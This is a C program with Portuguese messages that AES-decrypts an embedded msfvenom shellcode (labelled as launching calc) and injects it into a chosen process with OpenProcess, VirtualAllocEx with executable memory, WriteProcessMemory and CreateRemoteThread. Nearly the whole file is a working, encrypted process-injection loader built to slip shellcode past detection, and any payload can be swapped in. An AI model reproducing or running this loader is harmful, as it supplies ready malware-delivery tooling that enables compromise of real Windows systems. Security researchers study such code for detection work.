#include <stdio.h>
#include <windows.h>
#include <stdlib.h>
#include "include/aes.h"


int main(int argc, char* argv[]) {

    // msfvenom -p windows/x64/exec CMD=calc EXITFUNC=thread -f c
    unsigned char shellcode[] =
    "\x97\x5b\x53\x25\xfd\x7c\xa1\xbd\x9f\xba\xa7\x5e\x23\x49\x8f\x3b\x09\xcd\x48\xd2\x7f\xff\x5f\x42\xa5\x20\xeb\x57\x52\x5d\x05\x9d\xc7\xfa\x80\x59\xed\x56\x77\xd8\x6a\x45\x7a\x5e\x50\xba\xcb\x8f\x3b\x1b\x8e\x13\x38\x1a\x4b\xb7\x2e\x48\x29\x02\x93\x65\x82\x79\x89\x01\xe5\xe2\x07\x55\x2f\xea\xd0\x68\xb1\x06\xd9\xa0\x30\x9d\x2a\x70\x19\x30\x21\x66\x2c\x49\xee\xe0\xbf\x48\x07\x84\xb3\x40\x89\xdd\x39\x62\xbd\x19\xb9\x24\x57\x52\xf6\xc1\x97\xc6\xe3\xe8\x3d\xdf\x67\xe9\x8b\xc7\xd6\x43\x3f\xa8\x95\x13\xc1\x75\xeb\x7c\x1e\x63\xdd\xea\xf0\x93\xe7\xb5\xdd\x59\x39\x46\xc9\xbb\x59\x15\xa4\xa5\x67\x50\x2c\xe5\xa6\x8f\x49\x1e\x0c\xd2\x19\x24\x6a\xb6\x1e\x6b\x80\x4a\xa6\x7b\xd9\x57\x0a\x34\xe0\xb6\x2c\x03\xc6\xe1\x7b\xf5\x1c\x29\x8b\x22\x09\x4a\x48\xc0\x34\x4f\xbf\x21\xcc\xd1\x59\x48\xc4\x97\x82\x3a\x12\xca\x3e\x9a\x0f\xea\x03\x4b\xf8\x92\xb8\x41\x46\x9f\xbe\x33\x22\xc7\x45\x4d\x33\x3d\xe7\xb4\x9f\xaf\x11\xfd\x35\xd7\xbe\x86\x8b\xc5\x7d\x1e\x8e\x5d\x25\x0c\xd4\x5e\xe2\x6c\x0f\xcf\x30\xfb\x1a\x65\x02\x85\xdd\x9e\x15\x1a\xbd\x6c\x92\x0c\x26\x06\xf1\x40\x4f\x9b\x75\x90\x62\xec\x08\xe0\x2d\xdb";

    SIZE_T shellcodeSize = sizeof(shellcode);

    unsigned char key[] = "k3t1k3t1k3t1k3t1k3t1k3t1k3t1k3t1";
	unsigned char iv[] = "\x9d\x02\x35\x3b\xa3\x4b\xec\x26\x13\x88\x58\x51\x11\x47\xa5\x98";

	struct AES_ctx ctx;

	AES_init_ctx_iv(&ctx, key, iv);
	AES_CBC_decrypt_buffer(&ctx, shellcode, shellcodeSize);

    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    PVOID remoteBuffer = NULL;

    if (argc < 2) {
        printf("Uso: %s <PID>\n", argv[0]);
        return -1;
    }

    DWORD pid = atoi(argv[1]);

    if (pid == 0) {
        printf("PID inválido!\n");
        printf("Uso: %s <PID>\n", argv[0]);
        return -1;
    }

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        printf("[!] Erro ao abrir o processo: %d\n", GetLastError());
        return -1;
    }

    remoteBuffer = VirtualAllocEx(hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (remoteBuffer == NULL) {
        printf("[!] Erro ao alocar memória remota: %d\n", GetLastError());
        CloseHandle(hProcess);
        return -1;
    }

    WriteProcessMemory(hProcess, remoteBuffer, shellcode, shellcodeSize, NULL);

    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
    if (hThread == NULL) {
        printf("[!] Erro ao criar thread remota: %d\n", GetLastError());
        return -1;
    }

    printf("[+] Shellcode injetado com sucesso!\n");

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}